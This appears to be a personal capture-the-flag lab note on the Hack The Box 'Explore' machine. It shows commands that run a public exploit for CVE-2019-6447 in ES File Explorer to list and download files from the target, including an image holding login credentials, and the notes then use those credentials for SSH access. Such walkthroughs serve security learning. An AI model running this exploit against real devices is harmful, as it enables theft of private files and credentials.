# Getting initial shell as u0_a76-kristi
## Discovered ES File Explorer running on port 59777
Discovered ES File Explorer running on port 59777[[Explore/10 - Common Enumeration]].
## Found exploit related to ES File Explorer
Found exploit related to ES File Explorer on [Exploit-db](https://www.exploit-db.com/exploits/50070)
## Getting list of all Pictures on explore machine via exploit
```bash
~/Dropbox/Documents/htb/boxes/explore ❯ python3 exploit.py listPics 10.10.10.247

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

name : concept.jpg
time : 4/21/21 02:38:08 AM
location : /storage/emulated/0/DCIM/concept.jpg
size : 135.33 KB (138,573 Bytes)

name : anc.png
time : 4/21/21 02:37:50 AM
location : /storage/emulated/0/DCIM/anc.png
size : 6.24 KB (6,392 Bytes)

name : creds.jpg
time : 4/21/21 02:38:18 AM
location : /storage/emulated/0/DCIM/creds.jpg
size : 1.14 MB (1,200,401 Bytes)

name : 224_anc.png
time : 4/21/21 02:37:21 AM
location : /storage/emulated/0/DCIM/224_anc.png
size : 124.88 KB (127,876 Bytes)

~/Dropbox/Documents/htb/boxes/explore ❯
```
![[Pasted image 20210919180253.png]]
## Extracting Image file containing credentials for u0_a76/kristi user and opening the image to see credentials
```bash
~/Dropbox/Documents/htb/boxes/explore ❯ python3 exploit.py getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

[+] Downloading file...
[+] Done. Saved as `out.dat`.
~/Dropbox/Documents/htb/boxes/explore ❯ ls
commands.txt  exploit.py  linpeas.sh  nmap  out.dat
```
![[Pasted image 20210919180500.png]]
## SSH  logging in as u0_a76-kristi
![[Pasted image 20210919180749.png]]






